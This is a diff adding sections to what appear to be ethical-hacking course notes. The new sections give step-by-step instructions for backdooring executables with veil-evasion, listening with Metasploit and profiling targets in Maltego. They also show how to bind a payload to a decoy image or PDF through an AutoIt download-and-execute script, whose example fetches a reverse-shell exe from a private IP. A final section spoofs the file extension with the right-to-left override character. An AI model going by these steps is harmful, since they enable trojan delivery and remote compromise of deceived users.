@@ -773,8 +773,14 @@ Nexpose is a vulnerability management framework,
 # keep veil up to date
 # Start listening to connections before sending backdoor
 ```
+**Backdooring exe’s**
+1. Run veil-evasion > veil-evasion
+2. Select a generic/backdoor_factory > use [payload number]
+3. Set options > set [option] [value]
+4. Set original exe > set ORIGINAL_EXE [full path]
+5. Generate backdoor > generate
 
-**Listening for connections** <br>
+**Listening for connections : Run hander**  <br>
 For above backdoor to work, we need to open a port to listen any connection on that port
 - we'll use metasploit framework to listen connections
 1. Run metasploit > msfconsole
@@ -859,3 +865,57 @@ $ msfconsole
   - http://www.winmd5.com/
 
 ## Gaining access : Client Side Attacks - Social Engineering
+- with previous Client Side attacks you need to be MITM to gain access
+- With social engineering you can get attack remotely
+- Gather Info about the user(s)
+- Build a strategy based on the information
+- Build a backdoor based on the info
+
+## Maltego - Information Gathering Tool
+- Maltego is an information gathering tool that can be used to collect information about ANYTHING
+- Target can be website, company, person etc
+- Discover entities associated with targets
+- Display info on a graph
+- **Come up with an attack strategy**
+- To run maltego type the following in terminal :
+  - > maltego
+- register with email
+- you can add(install) transformers (these are plugin that allow you gather information about specific things)
+- in new project:
+  - entities (left pane)
+  - you can add domains, MX record, websites, person, URLs etc (drag and drop entity to main page)
+  - you can add social Networks
+  - fill the details in right block (property view)
+  - entities -> manage entities -> add entities -> advance settings -> add palette item (like twitter)
+- Fix Maltego 4.0 Not Starting : https://www.youtube.com/watch?v=6MaidZjmbjk&feature=youtu.be
+
+## Backdooring any file type (images, pdf etc)
+- Combine backdoor with any file - Generic solution.
+- Users are more likely to run a pdf, image or audio file than an executable.
+- Works well with social engineering.
+- The idea is to convert the original (pdf, jpg, mp3) file to an exe, then combine it with a backdoor using veil-evasion.
+  1. Download Autoit from https://www.autoitscript.com/site/autoit/downloads/
+  2. Install it. > wine [downloaded file]
+  3. Download the run script from resources : **autoit-download-and-execute.txt** (rename file Extension from .txt. to .au3)
+  4. Place original file in the same directory as the script.
+  5. Set original file name in the script.
+  6. set url1 to file like jpg (online accessible) file url nad url2 -> path of exe (online accessible)
+    - ex: $urls = "http://www.somedomain.com/da/picture.jpg,http://10.20.14.213:/files/rev_https_8080.exe"
+  7. Generate exe using Autoit script to exe converter.
+  8. Tool : Aut2Exe  -> select script, executable and icon
+  9. before downloading from client side, start listening connection using metasploit :
+    - **see : Listening for connections : Run hander**
+
+## Spoofing backdoor extension
+- Change extension of the trojan from exe to a suitable one.
+- Make the trojan even more trustable.
+- We will use an old trick using the “right to left overload” character.
+  1. Open up the character map.
+  2. Go to find.
+  3. Search for U+202E
+  4. Copy character.
+  5. Rename trojan and in the following format -> trojan[RTLO]fdp.exe
+    - Where RTLO is the copied character and “fdp” is the reverse of the extension that
+you want to use.
+  6. it will become : trojan[RTLO]fdp.exe --> trojanexe.pdf
+- archive the file so that browser will not replace RTLO character
